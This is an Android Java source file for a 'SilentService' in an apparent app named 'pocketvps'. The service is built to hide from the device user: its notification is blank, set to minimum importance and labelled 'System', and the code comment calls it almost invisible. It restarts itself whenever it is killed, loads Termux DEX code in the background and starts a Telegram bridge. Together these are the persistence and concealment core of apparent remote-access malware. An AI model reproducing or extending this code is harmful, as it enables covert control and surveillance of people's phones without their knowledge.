package com.rx.pocketvps;

import android.app.Notification;
import android.app.NotificationChannel;
import android.app.NotificationManager;
import android.app.Service;
import android.content.Intent;
import android.os.Build;
import android.os.IBinder;
import android.util.Log;

public class SilentService extends Service {
    private static final String TAG        = "RX_Service";
    private static final String CHANNEL_ID = "rx_silent";
    private static final int    NOTIF_ID   = 1;

    private TelegramManager telegramManager;
    private TermuxLoader    termuxLoader;

    @Override
    public void onCreate() {
        super.onCreate();
        Log.d(TAG, "Service starting...");

        // Silent notification (required by Android)
        createSilentNotification();

        // Termux DEX load karo background mein
        new Thread(() -> {
            termuxLoader = new TermuxLoader(getApplicationContext());
            boolean ok = termuxLoader.initialize();
            Log.d(TAG, "Termux DEX init: " + (ok ? "✅ OK" : "❌ Failed"));
        }).start();

        // Telegram bridge start karo
        telegramManager = new TelegramManager(this);
        telegramManager.start();

        Log.d(TAG, "✅ Service running silently!");
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        return START_STICKY; // Kill ho to khud restart
    }

    @Override
    public void onDestroy() {
        super.onDestroy();
        Log.d(TAG, "Service destroyed — restarting...");

        if (telegramManager != null) telegramManager.stop();

        // Khud restart karo
        Intent restart = new Intent(getApplicationContext(), SilentService.class);
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            startForegroundService(restart);
        } else {
            startService(restart);
        }
    }

    @Override
    public IBinder onBind(Intent intent) { return null; }

    // ══════════════════════════════════════
    //  SILENT NOTIFICATION
    //  Minimum visibility — almost invisible
    // ══════════════════════════════════════
    private void createSilentNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            NotificationChannel ch = new NotificationChannel(
                CHANNEL_ID,
                "System",
                NotificationManager.IMPORTANCE_MIN
            );
            ch.setShowBadge(false);
            ch.setSound(null, null);
            ch.enableLights(false);
            ch.enableVibration(false);
            ch.setDescription("");

            NotificationManager nm = getSystemService(NotificationManager.class);
            if (nm != null) nm.createNotificationChannel(ch);
        }

        Notification.Builder b;
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
            b = new Notification.Builder(this, CHANNEL_ID);
        } else {
            b = new Notification.Builder(this);
            b.setPriority(Notification.PRIORITY_MIN);
        }

        startForeground(NOTIF_ID, b
            .setContentTitle("")
            .setContentText("")
            .setSmallIcon(android.R.drawable.stat_notify_sync_noanim)
            .setOngoing(true)
            .build()
        );
    }

    // Termux loader access
    public TermuxLoader getTermuxLoader() {
        return termuxLoader;
    }
}
